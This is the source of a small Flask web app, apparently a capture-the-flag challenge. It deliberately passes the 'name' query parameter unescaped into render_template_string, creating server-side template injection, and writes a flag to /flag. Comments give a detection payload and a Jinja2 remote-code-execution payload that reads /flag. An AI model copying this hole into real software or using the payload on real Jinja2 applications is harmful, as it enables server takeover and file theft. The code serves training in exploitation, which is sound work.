from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
FLAG = os.getenv("FLAG", "FLAG_PLACEHOLDER")


@app.route('/')
def index():
    name = request.args.get('name', 'Guest')

    # 漏洞点：用 % 字符串拼接直接传入 render_template_string
    # Jinja2 表达式会被执行
    # 验证 payload: ?name={{7*7}}  → 返回 49 说明存在 SSTI
    # RCE payload:  ?name={{''.__class__.__mro__[1].__subclasses__()[xxx]('cat /flag',shell=True,stdout=-1).communicate()[0].decode()}}
    template = '''
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<title>欢迎页面</title>
<style>
  body{font-family:"Microsoft YaHei",sans-serif;background:#f0f2f5;
       display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
  .card{background:#fff;padding:50px;border-radius:8px;
        box-shadow:0 2px 12px rgba(0,0,0,.1);text-align:center;max-width:500px}
  h1{color:#333;margin:0 0 16px}
  p{color:#666}
  .name{color:#4a90e2;font-weight:bold;font-size:1.2em}
  form{margin-top:20px;display:flex;gap:10px}
  input{flex:1;padding:10px;border:1px solid #ddd;border-radius:4px;font-size:14px}
  button{padding:10px 20px;background:#4a90e2;color:#fff;border:none;
         border-radius:4px;cursor:pointer}
</style>
</head>
<body>
<div class="card">
  <h1>👋 欢迎来到我们的网站</h1>
  <p>你好，<span class="name">''' + name + '''</span>！</p>
  <p>这是一个个性化欢迎页面</p>
  <form method="GET">
    <input type="text" name="name" placeholder="输入你的名字">
    <button type="submit">更新</button>
  </form>
</div>
</body>
</html>
    '''

    return render_template_string(template)


# flag 写入 /flag 供 RCE 读取
if FLAG and FLAG != 'FLAG_PLACEHOLDER':
    try:
        with open('/flag', 'w') as f:
            f.write(FLAG)
    except Exception:
        pass


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
